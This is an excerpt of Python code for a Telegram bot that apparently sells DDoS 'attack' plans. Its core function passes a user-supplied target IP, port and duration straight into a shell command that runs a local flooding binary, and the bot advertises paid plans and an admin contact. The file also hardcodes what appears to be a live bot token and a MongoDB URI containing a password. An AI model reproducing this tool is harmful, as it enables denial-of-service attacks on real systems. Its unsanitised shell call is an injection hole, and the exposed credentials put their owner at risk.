...
TOKEN = '7512779341:AAEOzYU9xwJQUcjC72u6YC_J8uRlF7lYK4o'
MONGO_URI = 'mongodb+srv://Yuvraj:Yuvraj@yuvraj.1pqbb.mongodb.net/?retryWrites=true&w=majority&appName=Yuvraj'
FORWARD_CHANNEL_ID = -1002187302490
CHANNEL_ID = -1002187302490
error_channel_id = -1002187302490
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./yuvraj {target_ip} {target_port} {duration} 4")
...
def handle_message(message):
    if message.text == "Instant Plan 🧡":
        ...
        bot.send_message(message.chat.id, "*Please use the following link for Canary Download: https://t.me/YUVRAJBGMILEAKS/244*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*DM FOR ANY HELP @ITS_YUVRAJ_KING*", parse_mode='Markdown')
    elif message.text == "Contact admin✔️":
        bot.reply_to(message, "*ADMIN - @ITS_YUVRAJ_KING*", parse_mode='Markdown')
    else:
